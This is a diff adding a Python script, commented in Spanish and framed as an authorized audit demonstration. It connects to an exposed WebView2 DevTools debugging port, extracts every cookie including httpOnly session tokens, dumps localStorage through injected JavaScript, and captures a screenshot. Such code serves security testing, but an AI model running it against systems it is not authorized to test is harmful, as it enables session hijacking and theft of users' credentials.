@@ -1,0 +1,70 @@
+#!/usr/bin/env python3
+"""
+Cliente CDP mínimo para demostración del patrón de extracción.
+Conecta a un target WebView2 y ejecuta comandos de auditoría.
+NO USAR EN SISTEMAS DE PRODUCCIÓN NI SIN AUTORIZACIÓN.
+"""
+
+import json
+import asyncio
+import websockets  # pip install websockets
+
+async def cdp_command(ws, method: str, params: dict = None) -> dict:
+    """Envía un comando CDP y espera la respuesta."""
+    msg = {"id": 1, "method": method}
+    if params:
+        msg["params"] = params
+    await ws.send(json.dumps(msg))
+    response = await ws.recv()
+    return json.loads(response)
+
+async def audit_target(ws_url: str):
+    """Ejecuta una auditoría de seguridad sobre un target CDP."""
+    async with websockets.connect(ws_url) as ws:
+        # 1. Habilitar el dominio Network para acceder a cookies
+        await cdp_command(ws, "Network.enable")
+        
+        # 2. Extraer TODAS las cookies, incluidas las httpOnly
+        cookies_resp = await cdp_command(ws, "Network.getAllCookies")
+        cookies = cookies_resp.get("result", {}).get("cookies", [])
+        print(f"[+] {len(cookies)} cookies extraídas")
+        
+        # Clasificar cookies por atributos de seguridad
+        http_only = [c for c in cookies if c.get("httpOnly")]
+        secure = [c for c in cookies if c.get("secure")]
+        session = [c for c in cookies 
+                   if "session" in c.get("name", "").lower()
+                   or "token" in c.get("name", "").lower()]
+        
+        print(f"    httpOnly: {len(http_only)}")
+        print(f"    Secure:   {len(secure)}")
+        print(f"    Sesión/Token: {len(session)}")
+        
+        # 3. Ejecutar JavaScript para acceder a localStorage
+        js_code = """
+        (() => {
+            const data = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                data[key] = localStorage.getItem(key).substring(0, 100);
+            }
+            return JSON.stringify(data);
+        })()
+        """
+        ls_resp = await cdp_command(ws, "Runtime.evaluate", {
+            "expression": js_code,
+            "returnByValue": True
+        })
+        ls_data = ls_resp.get("result", {}).get("result", {})
+        print(f"[+] localStorage: {ls_data.get('value', '{}')[:200]}")
+        
+        # 4. Capturar screenshot del estado actual
+        screenshot_resp = await cdp_command(ws, "Page.captureScreenshot", {
+            "format": "png",
+            "quality": 80
+        })
+        img_data = screenshot_resp.get("result", {}).get("data", "")
+        print(f"[+] Screenshot capturado: {len(img_data)} bytes (base64)")
+
+# Ejemplo de uso (requiere ws_url de la fase de enumeración):
+# asyncio.run(audit_target("ws://127.0.0.1:9222/devtools/page/<ID>"))
